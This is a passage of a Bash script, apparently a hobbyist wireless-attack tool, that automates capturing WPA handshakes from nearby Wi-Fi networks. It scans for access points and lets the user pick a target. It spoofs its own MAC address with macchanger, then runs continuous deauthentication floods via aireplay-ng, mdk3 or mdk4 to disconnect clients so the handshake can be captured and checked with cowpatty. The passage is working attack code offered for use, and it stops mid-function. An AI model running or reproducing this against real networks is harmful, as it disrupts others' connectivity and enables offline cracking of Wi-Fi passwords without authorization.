#!/bin/bash
#
#******************************************************************************************
#Author:                QianSong
#QQ:                    xxxxxxxxxx
#Date:                  2023-11-04
#FileName:              wireless-handshaker.sh
#URL:                   https://github.com
#Description:           The test script
#Copyright (C):         QianSong 2023 All rights reserved
#******************************************************************************************

#ding  yi  bian  liang
work_dir="$(dirname "$(realpath -s $0)")/temp"
result_dir="$(dirname "$(realpath -s $0)")/result"

#general vars
force_killing_network_manager=1

#pan duan shi fou root yon hu yun xing
if [ "${UID}" != "0" ]; then
        echo -e "\033[31mPermission denied, please run this script as root.\033[0m"
        exit 1
fi

#pan duan work_dir shi  fou  cun  zai
if [ ! -d "${work_dir}" ]; then
        mkdir "${work_dir}" -p
fi

#pan duan result_dir shi  fou  cun  zai
if [ ! -d "${result_dir}" ]; then
        mkdir "${result_dir}" -p
fi

#######################################
# 打印使用方法
# Globals:
#   none
# Arguments:
#   none
# Outputs:
#   none
# Returns:
#   none
#######################################
function print_usage() {

        echo "用法：bash $0 [选项] [选项值]"
        echo ""
        echo "选项："
        echo "  -k, --killing-network-manager                 是否强制关闭网卡干扰进程network-manager服务，1代表是(Default)，0代表否"
        echo "  -h, --help                                    输出此帮助信息并退出"
}

#######################################
# 获取用户传入的脚本参数，并作相应处理
# Globals:
#   ${force_killing_network_manager}、
# Arguments:
#   "$@"
# Outputs:
#   none
# Returns:
#   none
#######################################
function get_user_option_paramater() {

        local opts
        opts="$(getopt -q -o k:,h -l killing-network-manager:,help -- "$@")"
        if [ $? -ne 0 ]; then
                print_usage
                exit 1
        fi
        eval set -- "${opts}"
        while true; do
                case "$1" in
                        -k|--killing-network-manager)
                                if [ "$2" == "1" ]; then
                                        force_killing_network_manager=1
                                elif [ "$2" == "0" ]; then
                                        force_killing_network_manager=0
                                else
                                        echo -e "\033[31mBad option \033[37m$1 $2\033[0m"
                                        print_usage
                                        exit 1
                                fi
                                shift 2
                                ;;
                        -h|--help)
                                print_usage
                                shift 1
                                exit 0
                                ;;
                        --)
                                shift 1
                                break
                                ;;
                        *)
                                echo -e "\033[31mInternal error\033[0m"
                                exit 1
                                ;;
                esac
        done
}

#######################################
# da ying app huan ying jie mian tu pian JPG
# Globals:
#   none
# Arguments:
#   none
# Outputs:
#   yi ge tu pian app logo
# Returns:
#   none
#######################################
function logo() {

# print fuo zhu png
cat <<EOF

                                  _oo0oo_
                                 088888880
                                 88" . "88
                                 (| -_- |)
                                  0\ = /0
                               ___/'---'\___
                             .' \\\\|     |// '.
                            / \\\\|||  :  |||// \\.
                           /_ ||||| -:- |||||- \\.
                          |   | \\\\\\  -  /// |   |
                          | \_|  ''\---/''  |_/ |
                          \  .-\__  '-'  __/-.  /
                        ___'. .'  /--.--\  '. .'___
                     ."" '<  '.___\_<|>_/___.' >'  "".
                    | | : '-  \'.;'\ _ /';.'/ - ' : | |
                    \  \ '_.   \_ __\ /__ _/   .-' /  /
                ====='-.____'.___ \_____/___.-'____.-'=====
                                  '=---='

              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                        佛祖保佑    iii    永不BUG

EOF
}

#######################################
# da ying app huan ying jie mian tu pian JPG
# Globals:
#   none
# Arguments:
#   none
# Outputs:
#   yi ge tu pian app logo
# Returns:
#   none
#######################################
function print_app_info() {

# ding yi color vars
local color_1='\033[1;30m'
local color_2='\033[1;31m'
local color_3='\033[1;32m'
local color_4='\033[1;34m'
local color_5='\033[1;35m'
local color_6='\033[1;36m'
local color_7='\033[1;33m'
local color_8='\033[1;37m'
local RST='\033[0m'

# print first jpg
clear
# zifu hua shen cheng  fang fa: toilet -f smblock -t 'ATTACKER_Q               ATTACKER_Q'
# an zhuang zi fu hua  tool: apt install toilet
echo -e """
${color_2}▞▀▖▀▛▘▀▛▘▞▀▖▞▀▖▌ ▌▛▀▘▛▀▖   ▞▀▖               ▞▀▖▀▛▘▀▛▘▞▀▖▞▀▖▌ ▌▛▀▘▛▀▖   ▞▀▖
▙▄▌ ▌  ▌ ▙▄▌▌  ▙▞ ▙▄ ▙▄▘   ▌ ▌               ▙▄▌ ▌  ▌ ▙▄▌▌  ▙▞ ▙▄ ▙▄▘   ▌ ▌
▌ ▌ ▌  ▌ ▌ ▌▌ ▖▌▝▖▌  ▌▚    ▌▚▘               ▌ ▌ ▌  ▌ ▌ ▌▌ ▖▌▝▖▌  ▌▚    ▌▚▘
▘ ▘ ▘  ▘ ▘ ▘▝▀ ▘ ▘▀▀▘▘ ▘▀▀▀▝▘▘               ▘ ▘ ▘  ▘ ▘ ▘▝▀ ▘ ▘▀▀▘▘ ▘▀▀▀▝▘▘${RST}
                            ${color_3}~=:by XxxxXxxx1:=~${RST}
                     > ${color_4}\033[4mhttps://github.com/XxxxXxxx1${RST} <

"""

# loop print fuo zhu png
local i r_num r_char r_color
IFS=$'\n'
for i in $(logo)
do
        r_num="$(awk -v random="${RANDOM}" 'BEGIN{print random % 8 + 1}')"
        r_char="\$color_${r_num}"
        r_color="$(eval "echo \"${r_char}\"")"
        echo -e "${r_color}${i}${RST}"
        sleep 0.1
done

# print process info
local char
i=1
while [ "${i}" -lt 5 ]; do
        for char in '/' '.' '\'
        do
                echo -n "                                    [${char}]                                      "
                echo -ne "\r\r"
                sleep 0.2
        done
        let i++
done
echo -e "\n"
sleep 0.3
}

#######################################
# 安装必要的组件工具
# Globals:
#   none
# Arguments:
#   传入参数为软件包名称
# Outputs:
#   输出组件的安装过程信息
# Returns:
#   none
#######################################
function install_dependent_software() {

        apt update
        if [ $? -ne 0 ]; then
                echo -e "\033[31mnetwork error\033[0m"
                exit 2
        fi
        apt install "$1" -y
        if [ $? -ne 0 ]; then
                echo -e "\033[31mnetwork error\033[0m"
                exit 3
        fi
}

#######################################
# 安装必要的组件工具
# Globals:
#   none
# Arguments:
#   none
# Outputs:
#   输出组件的安装过程信息
# Returns:
#   none
#######################################
function install_essensiel_tool() {

        #pan  duan  shi  fou  an zhuang  le  yi  lai  ruan  jian
        local i exit_code
        for i in mdk3 mdk4 airmon-ng airodump-ng xterm dos2unix aireplay-ng macchanger cowpatty
        do
                type "${i}" >/dev/null 2>&1
                exit_code=$?
                if [ "${exit_code}" -eq 0 ]; then
                        echo -e "${i}.....................\033[32mOK\033[0m"
                else
                        echo -e "${i}.....................\033[33mInstalling\033[0m"
                        case "${i}" in
                                mdk3)
                                        install_dependent_software mdk3
                                        ;;
                                mdk4)
                                        install_dependent_software mdk4
                                        ;;
                                airmon-ng)
                                        install_dependent_software aircrack-ng
                                        ;;
                                airodump-ng)
                                        install_dependent_software aircrack-ng
                                        ;;
                                aireplay-ng)
                                        install_dependent_software aircrack-ng
                                        ;;
                                xterm)
                                        install_dependent_software xterm
                                        ;;
                                dos2unix)
                                        install_dependent_software dos2unix
                                        ;;
                                macchanger)
                                        install_dependent_software macchanger
                                        ;;
                                cowpatty)
                                        install_dependent_software cowpatty
                                        ;;
                                *)
                                        echo -e "\033[31mUknown error..\033[0m"
                                        exit 4
                                        ;;
                        esac
                fi
                sleep 0.1
        done
}

#######################################
# 杀死网卡干扰进程
# Globals:
#   none
# Arguments:
#   none
# Outputs:
#   none
# Returns:
#   none
#######################################
function kill_busy_process() {

        airmon-ng check kill >/dev/null 2>&1
        if [ $? -ne 0 ]; then
                echo -e "\033[31mError for check kill Disturbed process, quit !\033[0m"
                exit 1
        fi
}

#######################################
# 打印一个简短提示信息
# Globals:
#   none
# Arguments:
#   none
# Outputs:
#   none
# Returns:
#   none
#######################################
function print_notice() {

        echo -e "\n"
        echo -e "\033[33m加载完毕！正在为您启动，请稍等鸡儿几秒钟.......\033[0m"
        sleep 5
        clear
}

#######################################
# 后代进程ID查找函数
# Globals:
#   none
# Arguments:
#   传入参数：数字类型pid号码
# Outputs:
#   none
# Returns:
#   none
#######################################
function get_treepid() {

        local pid sep opts
        opts="$(getopt -q -o s:,p: -l sep:,pid: -- "$@")" || return 1
        eval set -- "${opts}"
        while [[ true ]]; do
                case "$1" in
                        -s|--sep )
                                sep="$2"
                                shift 2
                                ;;
                        -p|--pid )
                                pid="$2"
                                shift 2
                                ;;
                        -- )
                                shift 1
                                break
                                ;;
                        * )
                                echo "Invalid usage" >&2
                                return 1
                                ;;
                esac
        done

        sep="${sep:- }"
        pid="${pid:-$1}"
        if [[ -z "${pid}" ]]; then
                return 1
        fi

        ps -eo ppid,pid --no-headers | awk -v root="${pid}" -v sep="${sep}" '
                function dfs(u) {
                        if (pids)
                                pids = pids sep u;
                        else
                                pids = u;
                        if (u in edges)
                                for (v in edges[u])
                                dfs(v);
                }
                {
                        edges[$1][$2] = 1;
                        if ($2 == root)
                                root_isalive = 1;
                }
                END {
                        if (root_isalive)
                                dfs(root);
                        if (pids)
                                print pids;
                }'
}

#######################################
# 扫描指定频段所有WiFi信号
# Globals:
#   ${scan_pid}、
# Arguments:
#   传入参数：扫描频段类型a、bg、bga
# Outputs:
#   none
# Returns:
#   none
#######################################
function scan_all_ap() {

        local i mom_pid child_pid mom_pid_sum iterm
        for i in 1
        do
                rm -rf "${work_dir}/dump"* >/dev/null 2>&1
                sleep 2
                xterm -geometry "107-0+0" -bg "#000000" -fg "#FFFFFF" -title "Scan all AP" -e airodump-ng "${wlan_card}" --band "$1" -w "${work_dir}/dump" &
                scan_pid=$!
                sleep 2
                mom_pid="${scan_pid}"
                child_pid="$(get_treepid "${mom_pid}"|awk '{for(i = 1; i <= NF; i++) printf("%s%s", $i,"\n")}')"
                mom_pid_sum="$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${mom_pid}$"|grep -v "grep"|wc -l)"
                while true
                do
                        if [ "${mom_pid_sum}" -gt 0 ]; then
                                mom_pid_sum="$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${mom_pid}$"|grep -v "grep"|wc -l)"
                                sleep 1
                        else
                                for iterm in ${child_pid}
                                do
                                        kill "${iterm}" >/dev/null 2>&1
                                done
                                break
                        fi
                done
                sleep 2
        done
}

#######################################
# 准备信号列表与客户端列表文件
# Globals:
#   none
# Arguments:
#   none
# Outputs:
#   none
# Returns:
#   none
#######################################
function prepare_server_client_list() {

        local target_line server_mac server_name server_mac_char
        rm -rf "${work_dir}/server_list.csv" >/dev/null 2>&1
        rm -rf "${work_dir}/client_list.csv" >/dev/null 2>&1
        rm -rf "${work_dir}/client.txt" >/dev/null 2>&1
        sleep 2
        target_line="$(cat "${work_dir}/dump-01.csv"|awk '/(^Station[s]?|^Client[es]?)/{print NR}')"
        target_line="$(awk -v target_line="${target_line}" 'BEGIN{print target_line - 1}')"
        cat "${work_dir}/dump-01.csv"|head -n "${target_line}"|dos2unix|egrep -v --text "^$" > "${work_dir}/server_list.csv"
        cat "${work_dir}/dump-01.csv"|tail -n +"${target_line}"|dos2unix|egrep -v --text "^$" > "${work_dir}/client_list.csv"
        
        #zhun bei sniff client list
        echo -e "server_mac,server_name" >> "${work_dir}/client.txt"
        while IFS=, read -r _ _ _ _ _ server_mac server_name; do
                server_mac_char="${#server_mac}"
                if [ "${server_mac_char}" -ge 17 ]; then
                        server_mac="$(echo "${server_mac}" | awk '{gsub(/ /,""); print}')"
                        echo -e "${server_mac},${server_name}" >> "${work_dir}/client.txt"
                fi
        done < "${work_dir}/client_list.csv"
        sleep 2
}

#######################################
# 格式化显示信号列表
# Globals:
#   none
# Arguments:
#   none
# Outputs:
#   none
# Returns:
#   none
#######################################
function display_result_info() {

        local server_list_total exp_mac chars_mac sp1 sp2 sp4 sp5 sp6 airodump_color normal_color client enc_length exp_channel exp_enc exp_auth exp_power exp_idlength exp_essid
        server_list_total="$(cat "${work_dir}/server_list.csv"|egrep --text -v "^$"|sed -r '1d'|awk -F "," '{if (length($1) >= 17) {print $0}}'|wc -l)"
        if [ "${server_list_total}" -gt 0 ]; then
                echo -e "\033[32m 序号         BSSID        信道     信号强度     加密方式      ESSID\033[0m"
                local i=0
                local valid_channels_24_and_5_ghz_regexp="[0-9]{1,3}"
                while IFS=, read -r exp_mac _ _ exp_channel _ exp_enc _ exp_auth exp_power _ _ _ exp_idlength exp_essid _; do
        
                        chars_mac="${#exp_mac}"
                        if [ "${chars_mac}" -ge 17 ]; then
                                i=$((i + 1))
                                if [ "${exp_power}" -lt 0 ]; then
                                        if [ "${exp_power}" -eq -1 ]; then
                                                exp_power=0
                                        else
                                                exp_power=$((exp_power + 100))
                                        fi
                                fi
        
                                exp_power="$(echo "${exp_power}" | awk '{gsub(/ /,""); print}')"
                                exp_essid=${exp_essid:1:${exp_idlength}}
        
                                if [[ ${exp_channel} =~ ${valid_channels_24_and_5_ghz_regexp} ]]; then
                                        exp_channel="$(echo "${exp_channel}" | awk '{gsub(/ /,""); print}')"
                                else
                                        exp_channel=0
                                fi
        
                                if [[ "${exp_essid}" = "" ]] || [[ -z "${exp_essid}" ]]; then
                                        exp_essid="(Hidden Network)"
                                fi
        
                                exp_enc="$(echo "${exp_enc}" | awk '{print $1}')"
        
                                if [ "${i}" -le 9 ]; then
                                        sp1="  "
                                elif [[ "${i}" -ge 10 ]] && [[ "${i}" -le 99 ]]; then
                                        sp1=" "
                                else
                                        sp1=""
                                fi
        
                                if [ "${exp_channel}" -le 9 ]; then
                                        sp2="  "
                                        if [ "${exp_channel}" -eq 0 ]; then
                                                exp_channel="-1"
                                        fi
                                        if [ "${exp_channel}" -lt 0 ]; then
                                                sp2=" "
                                        fi
                                elif [[ "${exp_channel}" -ge 10 ]] && [[ "${exp_channel}" -lt 99 ]]; then
                                        sp2=" "
                                else
                                        sp2=""
                                fi
        
                                if [ "${exp_power}" = "" ]; then
                                        exp_power=0
                                fi
        
                                if [ "${exp_power}" -le 9 ]; then
                                        sp4=" "
                                else
                                        sp4=""
                                fi
        
                                airodump_color="\033[37m"
                                normal_color="\033[0m"
                                client="$(grep "${exp_mac}" < "${work_dir}/client.txt")"
                                if [ "${client}" != "" ]; then
                                        airodump_color="\033[33m"
                                        client="*"
                                        sp5=""
                                else
                                        sp5=" "
                                fi
        
                                enc_length="${#exp_enc}"
                                if [ "${enc_length}" -gt 3 ]; then
                                        sp6=""
                                elif [ "${enc_length}" -eq 0 ]; then
                                        sp6="    "
                                else
                                        sp6=" "
                                fi
        
                                echo -e "${airodump_color}${sp1}[${i}]${client}   ${sp5}${exp_mac}  ${sp2}${exp_channel}        ${sp4}${exp_power}%          ${exp_enc}${sp6}       ${exp_essid}${normal_color}"
                        fi
                done < "${work_dir}/server_list.csv"
        
                #IFS=$'\n'
                #a=1
                #for i in $(cat ${work_dir}/server_list.csv|egrep --text -v "^$"|sed -r '1d'|awk -F "," '{if (length($1) >= 17) {print $0}}')
                #do
                #       temp_mac=$(echo ${i}|awk -F "," '{print $1}')
                #       cat ${work_dir}/client.txt|grep --text ${temp_mac} >/dev/null 2>&1
                #       client_stat=$?
                #       if [ "${client_stat}" == "0" ]; then
                #               echo -e "\033[33m[$a]\033[0m \033[32m$i\033[0m"
                #       else
                #               echo -e "\033[33m[$a]\033[0m $i"
                #       fi
                #       let a++
                #done
        else
                local you_zl
                echo -e "\033[31mNo network at the list, press [enter] to restart new hack\033[0m"
                read -p "> " you_zl
                hack_menu
        fi
}

#######################################
# 伪装网卡Mac地址
# Globals:
#   none
# Arguments:
#   none
# Outputs:
#   none
# Returns:
#   none
#######################################
function changer_mac_addr() {

        ip link set "${wlan_card}" down >/dev/null 2>&1
        macchanger -r "${wlan_card}" >/dev/null 2>&1
        ip link set "${wlan_card}" up >/dev/null 2>&1
}

#######################################
# 主抓包函数
# Globals:
#   ${mac_id}、${target_ap_name}、${cur_channel}
# Arguments:
#   传入信道扫描标识，支持：a、bg、bga
# Outputs:
#   none
# Returns:
#   none
#######################################
function handshake_bga() {

        #shao  miao   wifi  into  text wifi_info.txt
        echo "starting scan wifi info into ${work_dir}/dump-01.csv...."
        echo -e "\n"
        echo -e "\033[33m提示：当目标WiFi出现了，请手动关掉扫描窗口进入下一步！\033[0m"
        scan_all_ap "$1"
        echo -e "\033[32mDone!!\033[0m"
        
        #xian shi sao  miao  jie  guo
        dos2unix "${work_dir}/dump-01.csv" >/dev/null 2>&1
        prepare_server_client_list
        
        #xuan zhe mu biao AP mac
        clear
        display_result_info
        #xuan zhe yi  ge  xin hao
        local ap_num
        read -p "选择您要抓包的WiFi序号[num]: " ap_num
        while true
        do
                if [ -z "${ap_num}" ]; then
                        clear
                        display_result_info
                        echo -e "\033[33mAP_num must be a number and can not be null!!\033[0m"
                        read -p "选择您要抓包的WiFi序号[num]: " ap_num
                elif [[ ! "${ap_num}" =~ ^[0-9]+$ ]]; then
                        clear
                        display_result_info
                        echo -e "\033[33mAP_num must be a number and can not be null!!\033[0m"
                        read -p "选择您要抓包的WiFi序号[num]: " ap_num
                elif [ "${ap_num}" -gt "$(cat "${work_dir}/server_list.csv"|egrep --text -v "^$"|sed -r '1d'|awk -F "," '{if (length($1) >= 17) {print $0}}'|wc -l)" ]; then
                        clear
                        display_result_info
                        echo -e "\033[33mAP_num con't be great of total number for ap list!!\033[0m"
                        read -p "选择您要抓包的WiFi序号[num]: " ap_num
                elif [ "${ap_num}" -eq 0 ]; then
                        clear
                        display_result_info
                        echo -e "\033[33mAP_num is must be great of 0!!\033[0m"
                        read -p "选择您要抓包的WiFi序号[num]: " ap_num
                else
                        break
                fi
        done
        
        #ding yi mu biao  AP mac
        mac_id="$(cat "${work_dir}/server_list.csv"|egrep --text -v "^$"|sed -r '1d'|awk -F "," '{if (length($1) >= 17) {print $0}}'|awk -F "," "NR==${ap_num}"'{print $1}')"
        if [ -z "${mac_id}" ] || [ "${mac_id}" == "" ]; then
                echo -e "\033[31mThe target ap mac is null ,now program is exit.\033[0m"
                exit 8
        fi

        #ding yi mu miao AP name
        target_ap_name="$(cat "${work_dir}/server_list.csv"|grep --text "${mac_id}"|awk -F "," '{if (NF>1) {print $(NF-1)}}'|awk '{print $1}')"
        
        #ding yi dang  qian  xindao
        cur_channel="$(cat "${work_dir}/server_list.csv"|grep --text "${mac_id}"|awk '{print $6}'|awk -F "," '{print $1}'|egrep -v "^0$"|egrep -v "-"|egrep -v "[0-9]+e"|sort|uniq -c|sort -nk 1|tail -n 1|awk "NR==1"'{print $2}')"

        local you_zl exit_code
        echo -e "\033[36m已选择目标mac：\033[37m[${mac_id}]  \033[36m已选择目标AP：\033[37m[${target_ap_name}]  \033[36m已选择目标信道：\033[37m[${cur_channel}]\033[0m"
        echo -ne "\033[33m按[Enter]键继续...\033[0m"
        read you_zl

        local regexp="^(1|2)$"
        while true; do
                exec_handshake_cuptrue
                handshake_check
                exit_code=$?
                if [ "${exit_code}" -eq 0 ]; then
                        display_cap_location
                        echo -e "\033[32m恭喜抓取握手包成功了\033[0m"
                        echo -e "\n"
                        echo -e "\033[33m你需要再抓取其它的目标吗?\033[0m"
                        echo -e "--------"
                        echo -e "\033[32m1).\033[0m yes重新扫描并抓取其它目标"
                        echo -e "\033[32m2).\033[0m no退出程序"
                        echo -e "--------"
                        read -p "> " you_zl
                        while [[ ! "${you_zl}" =~ ${regexp} ]]; do
                                echo -e "\033[31mInvalid input.\033[0m"
                                read -p "> " you_zl
                        done
                        case "${you_zl}" in
                                1)
                                        break
                                        ;;
                                2)
                                        hard_core_exit
                                        ;;
                        esac
                else
                        echo -e "\033[31m似乎抓取握手包失败了\033[0m"
                        echo -e "\n"
                        echo -e "\033[33m你需要重新尝试吗?\033[0m"
                        echo -e "--------"
                        echo -e "\033[32m1).\033[0m yes再来一次"
                        echo -e "\033[32m2).\033[0m no重新扫描新的信号"
                        echo -e "--------"
                        read -p "> " you_zl
                        while [[ ! "${you_zl}" =~ ${regexp} ]]; do
                                echo -e "\033[31mInvalid input.\033[0m"
                                read -p "> " you_zl
                        done
                        case "${you_zl}" in
                                1)
                                        continue
                                        ;;
                                2)
                                        break
                                        ;;
                        esac
                fi
        done

        hack_menu
}

#######################################
# 启动抓包过程函数
# Globals:
#   ${attack_pid}、${handshake_pid}
# Arguments:
#   none
# Outputs:
#   none
# Returns:
#   none
#######################################
function exec_handshake_cuptrue() {

        #kai qi  zhua  bao  xterm
        handshake_pid=""
        local i
        if [ -z "${target_ap_name}" ] || [ "${target_ap_name}" == "" ]; then
                echo -e "\033[35mThe handshake program xterm have started.\033[0m"
                sleep 1
                for i in 1
                do
                        rm -rf "${result_dir}/${mac_id//:/-}"* >/dev/null 2>&1
                        sleep 2
                        changer_mac_addr
                        xterm -geometry "107-0+0" -bg "#000000" -fg "#FFFFFF" -title "Handshake AP for ${mac_id}" -e airodump-ng --ignore-negative-one -d "${mac_id}" -w "${result_dir}/${mac_id//:/-}" -c "${cur_channel}" -a "${wlan_card}" &
                        handshake_pid=$!
                        sleep 2
                done
        else
                echo -e "\033[35mThe handshake program xterm have started.\033[0m"
                sleep 1
                for i in 1
                do
                        rm -rf "${result_dir}/${target_ap_name}-${mac_id//:/-}"* >/dev/null 2>&1
                        sleep 2
                        changer_mac_addr
                        xterm -geometry "107-0+0" -bg "#000000" -fg "#FFFFFF" -title "Handshake AP for ${mac_id}" -e airodump-ng --ignore-negative-one -d "${mac_id}" -w "${result_dir}/${target_ap_name}-${mac_id//:/-}" -c "${cur_channel}" -a "${wlan_card}" &
                        handshake_pid=$!
                        sleep 2
                done
        fi
        
        #kai qi gon ji mdk xterm
        attack_pid=""
        case "${attack_mode}" in
                "aireplay-ng_deauth")
                        iw dev "${wlan_card}" set channel "${cur_channel}" >/dev/null 2>&1
                        xterm -geometry "85+0+0" -bg "#000000" -fg "#FF0009" -title "Duan kai conn on ${mac_id}" -e "${attack_command}" -0 0 -a "${mac_id}" --ignore-negative-one "${wlan_card}" &
                        attack_pid=$!
                        sleep 2
                        ;;
                "mdk3_deauth")
                        echo  "${mac_id}" >"${work_dir}/black_mac_list.txt"
                        echo  "" >>"${work_dir}/black_mac_list.txt"
                        xterm -geometry "85+0+0" -bg "#000000" -fg "#FF0009" -title "Duan kai conn on ${mac_id}" -e "${attack_command}" "${wlan_card}" d -b "${work_dir}/black_mac_list.txt" -c "${cur_channel}" &
                        attack_pid=$!
                        sleep 2
                        ;;
                "mdk4_deauth")
                        echo  "${mac_id}" >"${work_dir}/black_mac_list.txt"
                        echo  "" >>"${work_dir}/black_mac_list.txt"
                        xterm -geometry "85+0+0" -bg "#000000" -fg "#FF0009" -title "Duan kai conn on ${mac_id}" -e "${attack_command}" "${wlan_card}" d -b "${work_dir}/black_mac_list.txt" -c "${cur_channel}" &
                        attack_pid=$!
                        sleep 2
                        ;;
        esac
        
        #shu chu cao zuo ti shi info
        echo -e "\n"
        echo -e "\033[33m提示：当目标WiFi握手包出现了，请手动关掉抓包窗口进入下一步！\033[0m"
        
        #guan bi gon ji xterm
        local mom_pid child_pid mom_pid_sum iterm
        sleep 15
        echo -e "\033[32mClose the ${attack_mode} attack xterm...\033[0m"
        mom_pid="${attack_pid}"
        child_pid="$(get_treepid "${mom_pid}"|awk '{for(i = 1; i <= NF; i++) printf("%s%s", $i,"\n")}')"
        kill "${mom_pid}" >/dev/null 2>&1
        mom_pid_sum="$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${mom_pid}$"|grep -v "grep"|wc -l)"
        while true
        do
                if [ "${mom_pid_sum}" -gt 0 ]; then
                        mom_pid_sum="$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${mom_pid}$"|grep -v "grep"|wc -l)"
                        sleep 1
                else
                        for iterm in ${child_pid}
                        do
                                kill "${iterm}" >/dev/null 2>&1
                        done
                        break
                fi
        done
        sleep 2
        
        #guan bi handshake pid de jian ting program
        local i=1
        mom_pid="${handshake_pid}"
        child_pid="$(get_treepid "${mom_pid}"|awk '{for(i = 1; i <= NF; i++) printf("%s%s", $i,"\n")}')"
        mom_pid_sum="$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${mom_pid}$"|grep -v "grep"|wc -l)"
        while true
        do
                if [ "${mom_pid_sum}" -gt 0 ]; then
                        mom_pid_sum="$(ps -ef|awk "NR>1"'{print $2}'|egrep "^${mom_pid}$"|grep -v "grep"|wc -l)"
                        echo -n "Now ${i} seconds has passd.."
                        echo -ne "\r\r"
                        sleep 1
                        let i+=1
                else
                        for iterm in ${child_pid}
                        do
                                kill "${iterm}" >/dev/null 2>&1
                        done
                        break
                fi
        done
        sleep 2
}

#######################################
# 握手包有效性验证函数
# Globals:
#   none
# Arguments:
#   none
# Outputs:
#   none
# Returns:
#   0或1, 0表示握手包有效，1表示握手包无效
#######################################
function handshake_check() {

        local exit_code
        if [ -z "${target_ap_name}" ] || [ "${target_ap_name}" == "" ]; then
                echo -e "\033[35mChecking handshake \033[34m[${result_dir}/${mac_id//:/-}-01.cap]\033[0m \033[35m....\033[0m"
                sleep 3
                cowpatty -c -r ${result_dir}/${mac_id//:/-}-01.cap >/dev/null 2>&1
                exit_code=$?
                if [ "${exit_code}" -eq 0 ]; then
                        echo -e "\033[32mThe target handshake \033[34m[${result_dir}/${mac_id//:/-}-01.cap]\033[0m \033[32mcheck sucessfully \033[0m"
                        return 0
                else
                        echo -e "\033[31mThe target handshake \033[34m[${result_dir}/${mac_id//:/-}-01.cap]\033[0m \033[31mcheck faild \033[0m"
                        return 1
                fi
        else
                echo -e "\033[35mChecking handshake \033[34m[${result_dir}/${target_ap_name}-${mac_id//:/-}-01.cap]\033[0m \033[35m....\033[0m"
                sleep 3
                cowpatty -c -r ${result_dir}/${target_ap_name}-${mac_id//:/-}-01.cap >/dev/null 2>&1
                exit_code=$?
                if [ "${exit_code}" -eq 0 ]; then
                        echo -e "\033[32mThe target handshake \033[34m[${result_dir}/${target_ap_name}-${mac_id//:/-}-01.cap]\033[0m \033[32mcheck sucessfully \033[0m"
                        return 0
                else
                        echo -e "\033[31mThe target handshake \033[34m[${result_dir}/${target_ap_name}-${mac_id//:/-}-01.cap]\033[0m \033[31mcheck faild \033[0m"
                        return 1
                fi
        fi
}

#######################################
# 输出握手包保存路径信息
# Globals:
#   none
# Arguments:
#   none
# Outputs:
#   none
# Returns:
#   none
#######################################
function display_cap_location() {

        if [ -z "${target_ap_name}" ] || [ "${target_ap_name}" == "" ]; then
                echo -e "\033[36mThe handshake cap is saved in [${result_dir}/${mac_id//:/-}-01.cap] \033[0m"
        else
                echo -e "\033[36mThe handshake cap is saved in [${result_dir}/${target_ap_name}-${mac_id//:/-}-01.cap] \033[0m"
        fi
}

#######################################
# 抓包信息确认菜单，开启抓包
# Globals:
#   none
# Arguments:
#   none
# Outputs:
#   none
# Returns:
#   none
#######################################
function start_exec_handshake() {

        local you_zl
        clear
        echo -e "\033[35m当前网卡：\033[0m${wlan_card:-无}   \033[35m当前模式：\033[0m${attack_mode:-无}   \033[35m扫描频段：\033[0m${attack_band:-无}"
        echo -e "\033[36m--------------------------------------------------------------------\033[0m"
        echo -e "                             \033[36m抓包信息确认\033[0m                           "
        echo -e "\033[36m--------------------------------------------------------------------\033[0m"
        echo -e "\033[32m1. 返回上一级\033[0m"
        echo -e "--------"
        echo -e "\033[32m2. 开始启动抓包\033[0m"
        echo -e "\033[36m--------------------------------------------------------------------\033[0m"
        read -p "Please select: " you_zl
        case "${you_zl}" in
                1)
                        hack_menu
                        ;;
                2)
                        handshake_bga "${scan_band}"
                        ;;
                *)
                        start_exec_handshake
                        ;;
        esac
}

#######################################
# 攻击频段选择菜单，攻击入口
# Globals:
#   ${attack_band}、${scan_band}
# Arguments:
#   none
# Outputs:
#   none
# Returns:
#   none
#######################################
function hack_menu() {

        local you_zl
        clear
        echo -e "\033[35m当前网卡：\033[0m${wlan_card:-无}   \033[35m当前模式：\033[0m${attack_mode:-无}   \033[35m扫描频段：\033[0m${attack_band:-无}"
        echo -e "\033[36m--------------------------------------------------------------------\033[0m"
        echo -e "                             \033[36m频段选择菜单\033[0m                           "
        echo -e "\033[36m--------------------------------------------------------------------\033[0m"
        echo -e "\033[32m1. 返回主菜单\033[0m"
        echo -e "--------"
        echo -e "\033[32m2. 2.4Ghz\033[0m"
        echo -e "\033[32m3. 5Ghz\033[0m"
        echo -e "\033[32m4. 2.4Ghz & 5Ghz (将会扫描所有频段的信号)\033[0m"
        echo -e "\033[36m--------------------------------------------------------------------\033[0m"
        read -p "Please select: " you_zl
        case "${you_zl}" in
                1)
                        main_menu
                        ;;
                2)
                        attack_band="2.4Ghz"
                        scan_band="bg"
                        start_exec_handshake
                        ;;
                3)
                        attack_band="5Ghz"
                        scan_band="a"
                        start_exec_handshake
                        ;;
                4)
                        attack_band="2.4Ghz & 5Ghz"
                        scan_band="bga"
                        start_exec_handshake
                        ;;
                *)
                        hack_menu
                        ;;
        esac
}

#######################################
# 网卡列表、驱动、芯片打印函数
# Globals:
#   none
# Arguments:
#   none
# Outputs:
#   none
# Returns:
#   none
#######################################
function show_interface_list() {

        #bao cun list to file
        local if_list if_name iface_num dri_num if_driver if_usb_id if_chipest if_num
        rm -rf "${work_dir}/interface_list.txt" >/dev/null 2>&1
        sleep 2
        if_list="$(ip a|egrep "^[0-9]+" |awk -F ":" '{print $2}'|awk '{print $1}'|egrep -v "^lo$")"
        local i=1
        for if_name in ${if_list}
        do
                iface_num="$(airmon-ng|awk '/Interface/''{for(i=1; i<=NF; i++){print i " => " $i;}}'|grep "Interface"|awk '{print $1}')"
                dri_num="$(airmon-ng|awk '/Driver/''{for(i=1; i<=NF; i++){print i " => " $i;}}'|grep "Driver"|awk '{print $1}')"
                if_driver="$(airmon-ng|awk -v iface_num="${iface_num}" -v if_name="${if_name}" '{if($iface_num==if_name) {print $0}}'|awk -v dri_num="${dri_num}" '{print $dri_num}')"
                if_usb_id="$(cut -b 5-14 < "/sys/class/net/${if_name}/device/modalias" | sed 's/^.//;s/p/:/'|awk '{print tolower($1)}')"
